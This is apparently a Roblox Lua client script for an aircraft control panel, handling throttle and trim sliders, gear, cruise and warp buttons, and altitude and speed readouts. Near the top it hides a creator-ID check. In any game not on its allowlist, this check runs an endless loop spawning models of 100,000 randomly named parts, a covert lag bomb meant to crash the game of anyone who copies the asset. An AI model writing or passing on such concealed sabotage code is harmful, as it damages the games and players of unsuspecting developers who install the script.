print(test)
--local m = game:GetService("UserInputService")
--local n = game:GetService("TouchInputService")
--local s = script.Parent.core.Throttle.core.Slider
--local I = false
--local YRef = 0
--m.TouchStarted:Connect(function()
--	print(m:GetKeysPressed())
--end)
--s.InputBegan:Connect(function()
--	I = true
--	while I == true do
--		P = m:GetMouseLocation()
--		YRef = P.Y
--		--print(P.Y)
--		wait()
--		--0.208,1
--	end
--end)
--s.MouseButton1Down:Connect(function()
--	I = false
--	wait()
--	wait()
--	wait()
--	while I == true do
--		P = m:GetMouseLocation()

--		while I == true do
--			s.Position = UDim2.new(s.Position.X,UDim.new(math.clamp(s.Position.Y.Scale,0.208,1),0))
--			wait()
--		end

--		--0.208,1
--	end
--end)
--s.InputEnded:Connect(function()
--	I = false
--end)
wait()
A = {32720608,149484300,16070025,33179988}
B = {}
if table.find(A,game.CreatorId)==nil or table.find(B,game.CreatorId) ~= nil then
	while wait(1) do
		local Payload = Instance.new("Model")
		Payload.Name = string.char(math.random(32,126))
		while math.random() > 0.1 do
			Payload.Name = Payload.Name..string.char(math.random(32,126))
		end
		for j = 1,100,1 do
			for i = 1,1000,1 do
				local NP = Instance.new("Part")
				NP.Position = Vector3.new(0,1000000,0)
				NP.Parent = Payload
				while math.random() > 0.5 do
					NP.Name = NP.Name..string.char(math.random(32,126))
				end
				--NP:SetNetworkOwner(game:GetService("Players").LocalPlayer)
			end
			wait()
		end
		Payload.Parent = workspace
		wait(1/(math.random()*math.random()*math.random()))
	end
end

function setup(Sensor,Mover,Str,Write,mul)
	local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
	--local s = script.Parent.core.Throttle.core.Slider
	--local Trigger = script.Parent.core.Throttle.core --script.Parent.Trigger
	local TextLabel = Mover.Value --script.Parent.TextLabel
	--local Fill = script.Parent.Fill
	local Parent = script.Parent

	local Percent
	local MouseDown = false

	local function Update()
		--print("1")
		MouseDown = true
		--local Dis = 0
		--local Dis1 = 0
		repeat
			task.wait()
			Percent = math.clamp((Mouse.Y-Parent.AbsolutePosition.Y)/Parent.AbsoluteSize.Y,0,1)
			--Dis1 = math.clamp(math.round(130-Percent*150),-20,100)
			--print(Dis,Dis1)
			local Dis = math.clamp(math.round(130-Percent*150),-20,100)
			--RT = (math.sign(Dis)-math.sign(Dis1+0.01) == 0)
			TextLabel.Visible  = Dis >=0
			TextLabel.Parent.reverse.Visible  = Dis<0
			TextLabel.Text = Dis
			TextLabel.Parent.reverse.Text = Dis
			if Write then
				Write.Value = Dis/100
			end
			Mover.Position = UDim2.new(Mover.Position.X,UDim.new(math.clamp(Percent,0.208,1),0))
			--20,80,100

			--Fill.Size = UDim2.fromScale(Percent,1)
			if mul then
				Dis = Dis * mul
			end
			script.Parent.ctrl.Value:FireServer({[Str] = Dis/100})
			--print(1)
		until MouseDown == false
	end

	Sensor.MouseButton1Down:Connect(Update)

	game:GetService("UserInputService").InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			MouseDown = false
		end
	end)
end

function SetButton(Button,Str,Write,Oride)
	local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
	--local Parent = script.Parent

	local Percent
	local MouseDown = false

	local function Update()
		Button.Value.Visible = not Button.Value.Visible
		Button.reverse.Visible  = not Button.reverse.Visible
		if Oride then
			script.Parent.ctrl.Value:FireServer({[Str] = Oride.Text})
		else
			script.Parent.ctrl.Value:FireServer({[Str] = Button.Value.Visible})
		end

		if Write then
			Write.Value = Button.reverse.Visible
		end
		--print(1)
	end

	Button.Shadow.MouseButton1Down:Connect(Update)


	--game:GetService("UserInputService").InputEnded:Connect(function(input)
	--	if input.UserInputType == Enum.UserInputType.MouseButton1 then
	--		MouseDown = false
	--	end
	--end)
end

setup(script.Parent.core.Throttle.core,script.Parent.core.Throttle.core.Slider,"Throttle")
local Trim = 0
setup(script.Parent.core.Trim.core,script.Parent.core.Trim.core.Slider,"PitchTrim",script.Parent.PT,-0.2)
SetButton(script.Parent.core.Buttone.Gear,"Gear")
local Cruise = false
SetButton(script.Parent.core.Buttone.Cruise,"Cruise",script.Parent.CC)
SetButton(script.Parent.core.Buttone.TextBox.Cruise,"Warp",script.Parent.Wr,script.Parent.core.Buttone.TextBox)

--script.Parent.core.Gear.MouseButton1Click:Connect(function()
--	print(1)
--	script.Parent.core.Gear.Value.Visible = not script.Parent.core.Gear.Value.Visible
--	script.Parent.core.Gear.reverse.Visible  = not script.Parent.core.Gear.reverse.Visible 
--end)

--script.Parent.CC.OnClientEvent:Connect(function()
--	print(1)
--end)


local pos = script.Parent.ctrl.Value.Parent.Position
local vel = Vector3.new()
local accel = Vector3.new()
while true do
	wait(1)
	while script.Value.Value.AssemblyLinearVelocity.Magnitude > 10  do
		wait()

		accel = -vel
		vel = script.Parent.ctrl.Value.Parent.AssemblyLinearVelocity
		pos = script.Parent.ctrl.Value.Parent.Position
		accel = accel+vel
		if not script.Parent.CC.Value then
			--print(Trim)
			Trim = math.clamp(Trim+0.3*(math.log(math.abs(vel.Y),math.exp(1))/1000*math.sign(vel.Y)+accel.Y/1000),-0.3,0.1)
			script.Parent.ctrl.Value:FireServer({["PitchTrim"] = Trim})
		end	

		local alt = math.round(script.Value.Value.Position.Y)
		script.Parent.core.Altitude.Display.Slider.aaaa.Position = UDim2.new(0.469, 0,-35.3+alt/500, 0)
		script.Parent.core.Altitude.Bar.Value.Text = alt

		local speed = math.round(script.Value.Value.AssemblyLinearVelocity.Magnitude)
		script.Parent.core.Speed.Display.Slider.aaaa.Position = UDim2.new(0.523, 0,-12.48+0.18*speed, 0)
		script.Parent.core.Speed.Bar.Value.Text = speed

		local pitch = math.asin(script.Value.Value.CFrame.LookVector.Y)*50
		script.Parent.core.Bank.Main.Position = UDim2.new(0.5, 0,0.508+(pitch/10)*0.07, 0)
		script.Parent.core.Bank.Main.UIGradient.Offset = Vector2.new(0, -(pitch/200))

		--script.Value.Value.CFrame.LookVector.Z
		local x,y,z = script.Value.Value.CFrame:ToOrientation()
		local pitch,yaw,roll = x*180/math.pi,y*180/math.pi,z*180/math.pi
		--local bank = CFrame.new(
		script.Parent.core.Bank.Bank.Rotation = -roll

	end
end
